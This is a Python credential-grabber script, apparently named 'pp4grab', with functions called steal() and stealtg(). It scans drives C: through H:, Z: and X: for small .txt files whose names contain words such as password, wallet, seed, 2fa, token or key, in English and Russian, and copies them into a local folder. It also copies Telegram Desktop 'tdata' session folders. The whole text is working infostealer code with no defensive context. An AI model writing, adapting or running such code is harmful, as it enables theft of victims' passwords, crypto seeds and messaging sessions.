import os
import sys
import shutil

os.makedirs('files grabber', exist_ok=True)
os.makedirs('tg grabber', exist_ok=True)

tdisc = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'Z:\\', 'X:\\']

tfile = ['password', 'pass', 'login', 'discord', 'secret', 'wallet', 'wifi',
'parol', 'mail', 'email', 'пароль', 'пасс', 'данные', 'важное', 'пароли', 'секрет',
'роутер', 'почта', 'github-recovery-codes', 'rockstar', 'xbox', '2fa', 'two-factor',
'token', 'api', 'key', 'seed', 'private', 'dump', 'instagram', 'steam', 'стим', 'whatsapp',
'telegram', 'rutracker', 'youtube', 'github', 'gmail', 'epic', 'router', 'internet', 'архив',
'crypto', 'snapchat', 'facebook', 'фейсбук', 'снэпчат', 'документы', 'доки']

tg = ['tdata', 'telegram desktop']

ttxt = '.txt'

ch = 0
ch2 = 0

tdir = os.path.dirname(sys.argv[0]).lower()

def dir_size(path):
    size = 0
    try:
        for text, direct, files in os.walk(path):
            for file in files:
                size = size + os.path.getsize(os.path.join(text, file))
        return size
    except:
        print(f'Error read size: {path}')
        return 0

def steal():
    global ch
    print('pp4grab.')
    print('Start founding files.')
    try:
        for grab in tdisc:
            for text, direct, files in os.walk(grab):
                if text.lower().startswith(tdir): continue
                for name in files:
                    try:
                        namey = name.lower()
                        namesplit, txtsplit = os.path.splitext(namey)
                        if txtsplit == ttxt:
                            for word in tfile:
                                if word in namesplit:
                                    grabdir = os.path.join(text, name)
                                    if os.path.getsize(grabdir) > 5 * 1024 * 1024:
                                        continue
                                    ch = ch + 1
                                    unicname = f'{ch} {name}'
                                    final = os.path.join('files grabber', unicname)
                                    shutil.copy(grabdir, final)
                                    break                   
                    except:
                        print(f'Error copypaste file: {name}')
        print('End copypaste files.')
    except:
        print('Error script txt data.')

def stealtg():
    global ch2
    print('Start founding tg info.')
    try:
        for grabdir in tdisc:
            for text, direct, files in os.walk(grabdir):
                if text.lower().startswith(tdir): continue
                for name in direct:
                    try:
                        namey = name.lower()
                        for word in tg:
                            if word == namey:
                                rgrabdir = os.path.join(text, name)
                                if dir_size(rgrabdir) > 300 * 1024 * 1024:
                                    continue
                                ch2 = ch2 + 1
                                unicname = f'{ch2}_{name}'
                                patchs = os.path.join('tg grabber', unicname)
                                shutil.copytree(rgrabdir, patchs)
                                break
                    except:
                        print(f'Error copypaste tg info: {name}')
        print('End copypaste tg info.')
    except:
        print('Error script tg data.')
              
steal()
stealtg()

input('Press enter for exit.')